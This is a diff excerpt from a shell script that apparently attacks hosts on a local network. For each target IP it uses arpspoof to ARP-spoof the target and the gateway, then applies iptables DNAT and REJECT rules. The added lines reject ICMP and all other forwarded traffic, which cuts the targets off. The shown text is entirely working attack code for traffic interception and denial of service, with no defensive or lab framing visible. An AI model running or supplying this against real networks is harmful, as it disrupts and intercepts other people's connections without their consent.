@@ -145,6 +145,8 @@ for TARGET in $TARGET_IPS; do
         sudo iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
         sudo iptables -I FORWARD -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
         sudo iptables -I FORWARD -s "$TARGET" -p udp -j REJECT --reject-with icmp-port-unreachable
+        sudo iptables -I FORWARD -s "$TARGET" -p icmp -j REJECT --reject-with icmp-host-unreachable
+        sudo iptables -I FORWARD -s "$TARGET" -j REJECT
      (
         # Bidirectional ARP Spoofing
        sudo arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
